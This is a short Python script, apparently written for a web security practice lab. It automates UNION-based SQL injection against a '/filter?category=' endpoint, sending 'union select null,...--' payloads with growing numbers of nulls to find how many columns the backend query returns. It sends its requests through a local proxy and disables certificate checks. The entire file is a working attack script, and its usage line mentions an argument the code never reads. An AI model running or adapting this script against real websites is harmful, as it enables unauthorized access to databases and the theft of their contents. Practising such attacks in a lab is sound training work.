import requests
import sys
import urllib3
import logging

# To ignore the warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define the proxy settings
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
}

def exploit_sqli_col_number(url,proxies=None):
    path = "/filter?category=Gifts"
    for i in range(1,50):
        nulls = ','.join(['null']*i)
        # print(nulls)
        sql_payload = f"'+union+select+{nulls}--"
        # print(sql_payload)
        try:
            r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
            # print(r)
            if r.status_code == 200 and "Internal Server Error" not in r.text:
                return i
        except requests.RequestException as e:
            logging.error(f"Request failed: {e}")
            return False
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        print(f"[-] Usage: {sys.argv[0]} <url> <sqli_payload>" )
        print(f"[-] Example: {sys.argv[0]} www.example.com \"'\"")
        sys.exit(1)
    
    print('[+] Figuring out number of columns...')
    proxies_used = proxies

    num_columns = exploit_sqli_col_number(url, proxies=proxies_used)

    if num_columns:
        print(f'[+] The number of column is {num_columns}')
    else:
        print('[-] SQLi was unsuccessful')
        print('[-] Unable to determine the number of columns')